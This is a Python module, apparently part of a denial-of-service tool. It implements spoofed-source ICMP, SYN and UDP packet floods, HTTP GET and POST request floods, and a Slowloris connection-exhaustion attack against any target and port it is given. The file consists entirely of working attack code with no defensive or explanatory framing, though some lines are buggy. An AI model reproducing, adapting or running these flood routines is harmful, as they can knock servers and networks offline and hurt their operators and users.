from scapy.all import *
import time as timing
import requests
import json
import threading
import random
import socket
from globals import ICMP_PACKET_AMOUNT, SOCKET_COUNT
from log import log

def Spoof_IP():
    return RandIP()

def randInt():
	return random.randint(1000,9000)

class Layer3:
    @staticmethod
    def ICMP_Flood(target: str, time: int):
        end_t = timing.time() + time
        IP_Packets = []
        for i in range(ICMP_PACKET_AMOUNT):
            IP_Packets.append(scapy.all.IP(dst=str(target), src=Spoof_IP())/scapy.all.ICMP())
        while(timing.time() < end_t):
            send(IP_Packets, verbose=0)
            time.sleep(8)

class Layer4:
    @staticmethod
    def SYN_Flood(target: str, port: int, time: int):
        end_t = timing.time() + time
        IP_Packet = scapy.all.IP(dst=str(target), src=Spoof_IP())
        TCP_Packet = scapy.all.TCP(sport=randInt(), dport=int(port), flags="S", seq=randInt(), window=randInt())
        while(timing.time() < end_t):
            send(IP_Packet/TCP_Packet, verbose=0)

    @staticmethod
    def UDP_Flood(target: str, port: int, time: int):
        end_t = timing.time() + time
        IP_Packet = scapy.all.IP(dst=str(target), src=Spoof_IP())
        UDP_Packet = scapy.all.UDP(sport=randInt(), dport=int(port))
        payload = "A" * 450
        while(timing.time() < end_t):
            send(IP_Packet/UDP_Packet/payload, verbose=0)
            
    @staticmethod
    def EMAIL_Spam(target: str, time: int):
        pass

class Layer7:
    @staticmethod
    def HTTP_GET_Flood(target: str, time: int):
        end_t = timing.time() + time
        while(timing.time() < end_t):
             x = requests.get(target)

    @staticmethod
    def HTTP_POST_Flood(target: str, time: int, payload: str):
        end_t = timing.time() + time
        payload = json.loads(payload)
        while(timing.time() < end_t):
             res = requests.post(target, data=json.dumps(payload))

    @staticmethod
    def __send_header(name, value, socket):
        Layer7.__send_line(f"{name}: {value}", socket)

    def __send_line(line, socket):
        line = f"{line}\r\n"
        socket.send(line.encode("utf-8"))

    @staticmethod
    def __init_socket(target, port):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((target, port))
        Layer7.__send_line(f"GET /?{random.randint(0, 2000)} HTTP/1.1", s)
        ua = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36"
        Layer7.__send_header("User-Agent", ua, s)
        Layer7.__send_header("Accept-language", "en-US,en,q=0.5", s)
        return s

    @staticmethod
    def SLOW_Loris(target, port, time):
        list_of_sockets = []
        end_t = timing.time() + time

        for _ in range(SOCKET_COUNT):
            try:
                s = Layer7.__init_socket(target, port)
            except socket.error as e:
                logging.debug(e)
                break
            list_of_sockets.append(s)

        while timing.time() < end_t:
            try:
                for s in list(list_of_sockets):
                    try:
                        Layer7.__send_header("X-a", random.randint(1, 5000), s)
                    except socket.error:
                        list_of_sockets.remove(s)

                for _ in range(SOCKET_COUNT - len(list_of_sockets)):
                    try:
                        s = Layer7.__init_socket(target, port)
                        if s:
                            list_of_sockets.append(s)
                    except socket.error as e:
                        break
                timing.sleep(15)

            except(KeyboardInterrupt, SystemExit):
                break
